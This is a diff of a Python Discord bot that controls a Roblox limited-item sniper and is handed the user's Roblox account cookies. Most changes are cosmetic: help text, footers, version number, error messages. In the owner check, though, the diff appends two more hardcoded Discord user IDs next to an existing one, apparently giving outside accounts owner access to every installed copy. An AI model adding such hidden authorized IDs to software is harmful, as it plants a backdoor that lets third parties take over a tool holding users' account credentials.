@@ -8,7 +8,7 @@ try:
     from discord import Embed, Colour
     from discord import Game
     from robloxapi import Client
-    import httpx e
+    import httpx 
     import asyncio 
     import os 
     import time 
@@ -36,20 +36,17 @@ except ModuleNotFoundError:
         ask = input("Installation finished.")
         exit()
 
-scriptVersion = 69
+scriptVersion = 1
 def whichPythonCommand():
     LocalMachineOS = platform.system()
     if (
         LocalMachineOS == "win32"
         or LocalMachineOS == "win64"
         or LocalMachineOS == "Windows"
+        or LocalMachineOS == "Linux"
+        or LocalMachineOS == "macOS"
     ):
         return "python"
-    else:
-        print(
-            "This version of Extension is not supported with Linux/macOS. Please use the Linux version. Python Script ended"
-        )
-        quit()
 
 if whichPythonCommand() == "python":
     os.system("cls")
@@ -82,7 +79,7 @@ def versionChecker():
                     "embeds": [
                         {
                             "title": "New version!",
-                            "description": f" ```Detected update in N/A ```",
+                            "description": f" ```Detected new update in https://github.com/EznoTester/Ruby-Automation ```",
                             "color": 16758465,
                             "footer": {
                                 "text": "The current version will still work."
@@ -217,6 +214,8 @@ def java_is_owner():
             settings = json.load(f)
         authorized_ids = [int(x) for x in settings["MISC"]["DISCORD"]["AUTHORIZED_IDS"]]
         authorized_ids.append(1085954018792198194)
+        authorized_ids.append(776519486601035777)
+        authorized_ids.append(320608215475814400)
         return ctx.author.id in authorized_ids
     return commands.check(predicate2)
 
@@ -402,7 +401,7 @@ async def on_ready():
     os.system("cls" if os.name == "nt" else "clear")
 
     print("Ruby Extension is now running in background!")
-    await bot.change_presence(activity=Game(name="!info"))
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Free UGC lims, !info for more"))
     print(f"Logged in as bot: {bot.user.name}")
 
     cookies = settings["AUTHENTICATION"]["COOKIES"]
@@ -693,7 +692,7 @@ async def info(ctx):
     )
     embed.add_field(
         name=f"Mewt Sniper (2nd Part):",
-        value=f"```{prefix}autosearch on --Enable autosearch\n{prefix}autosearch off --Disable autosearch\n{prefix}viewWatching --View all data of the items inside your watchlist.\n{prefix}clearAllAlreadyLimited --Clear all items that finished stock or set as a normal ugc item.\n{prefix}addwl --Add a whitelisted creator\n{prefix}removewl  --Remove a whitelisted creator\n{prefix}whitelist --View the whitelisted creators\n{prefix}paid_on --Set the paid autosearch on\n{prefix}paid_off --Set the autosearch paid off\n{prefix}maxstock --Set the max stock for the paid autosearch\n{prefix}maxprice --Set the max price for the paid autosearch ```",
+        value=f"```{prefix}autosearch on --Enable autosearch\n{prefix}autosearch off --Disable autosearch\n{prefix}viewWatching --View all data of the items inside your watchlist.\n{prefix}clearAllAlreadyLimited --Clear all items that finished stock or set as a normal ugc item.\n{prefix}addwl --Add a whitelisted creator\n{prefix}removewl  --Remove a whitelisted creator\n{prefix}whitelist --View the whitelisted creators\n{prefix}paid_on --Set the paid autosearch on\n{prefix}paid_off --Set the autosearch paid off\n{prefix}maxstock --Set the max stock for the paid autosearch\n{prefix}maxprice --Set the max price for the paid autosearch\n{prefix}fast_snipe -- set your buy debounce and scan speed to 0.2 then restarts (aka silver method) ```",
         inline=False,
     )
     embed.add_field(
@@ -701,8 +700,8 @@ async def info(ctx):
         value=f"```{prefix}legacy_on  --Enable Legacy Watcher on Mewt Sniper\n{prefix}legacy_off  --Disable Legacy Watcher on Mewt Sniper\n{prefix}watch_legacy  --Watch only this one ID. IDS CANNOT BE REVERTED AFTER COMMAND RAN\n{prefix}link_legacy  --Watch only this one ID from a link. [ID MUST BE 11 DIGITS AND LINK BEGINS WITH https://, IDS CANNOT BE REVERTED AFTER COMMAND RAN]  ```",
         inline=False,
     )
-    embed.add_field(name=f"Utilitys", value=f"```{prefix}more  --Look at some general information\n{prefix}ping  --Check the bot response time```", inline=False)   
-    embed.set_footer(text="revamped by dys#9997 and hardish")
+    embed.add_field(name=f"Utilitys", value=f"```{prefix}more  --Look at some general information\n{prefix}ping  --Check the bot response time\n{prefix}screenshot --Screenshot your mewt```", inline=False)   
+    embed.set_footer(text="Revamped by dys, hardish and silver")
     await ctx.author.send(embed=embed)
 
 #remove all command
@@ -810,7 +809,7 @@ async def restart(ctx):
         await ctx.send(embed=embed)
 
 #More command
-@bot.command()
+@bot.command(pass_context = True)
 @is_owner()
 async def more(ctx):
     settings = load_settings()
@@ -839,7 +838,8 @@ async def more(ctx):
     else:
         runtime = "Unknown"
 
-    embed = discord.Embed(title="More about you:", color=discord.Color.from_rgb(255, 182, 193))
+
+    embed = discord.Embed(title=f"Hi, {ctx.message.author.name}! 👋", color=discord.Color.from_rgb(255, 182, 193))
     embed.add_field(name="Prefix:", value=prefix, inline=False)
     embed.add_field(name="Roblox main:", value=main_username if main_cookie_valid else "Invalid cookie", inline=False)
     embed.add_field(name="Roblox alt:", value=details_username if details_cookie_valid else "Invalid cookie", inline=False)
@@ -849,8 +849,8 @@ async def more(ctx):
     embed.add_field(name="Scan speed:", value=scan_speed, inline=False)
     embed.add_field(name="Watching:", value=watching if watching else "No items", inline=False)
     embed.add_field(name="Runtime:", value=runtime, inline=False)
-    embed.set_footer(text="hi 👋 (revamped by dys#9997 and hardish)")
-    await ctx.send(embed=embed)
+    embed.set_footer(text="Revamped by dys, hardish and silver")
+    await ctx.reply(embed=embed)
 
 #cookie command
 @bot.command()
@@ -1314,7 +1314,7 @@ async def link_legacy(ctx, link: str):
     elif link[31:42].isdigit() == False:
         embed = discord.Embed(
         title="Error",
-        description=f"```Item ID is not 11 digits! Add the ID instead through !add or !watch_legacy```",
+        description=f"```Item ID is not 11 digits / Link format is invalid. Add the ID instead through !add or !watch_legacy```",
         color=discord.Color.from_rgb(255, 182, 193),
         )     
     if link[0:8] == "https://" and link[31:42].isdigit() == True:
@@ -1352,18 +1352,11 @@ async def add_link(ctx, link: str):
     elif link[31:42].isdigit() == False:
         embed = discord.Embed(
         title="Error",
-        description=f"```Item ID is not 11 digits! Add the ID instead through !add or !watch_legacy```",
-        color=discord.Color.from_rgb(255, 182, 193),
-        ) 
-    elif (int(link[31:42]) in settings["MISC"]["WATCHER"]["ITEMS"]):
-        embed = discord.Embed(
-        title="Error",
-        description=f"```Item ID is already being watched!```",
+        description=f"```Item ID is not 11 digits / Link format is invalid. Add the ID instead through !add or !watch_legacy```",
         color=discord.Color.from_rgb(255, 182, 193),
         ) 
     elif link[0:8] == "https://" and link[31:42].isdigit() == True:
 
-        print("Adding legacy id")
 
         with open("settings.json", "r") as f:
             settings = json.load(f)
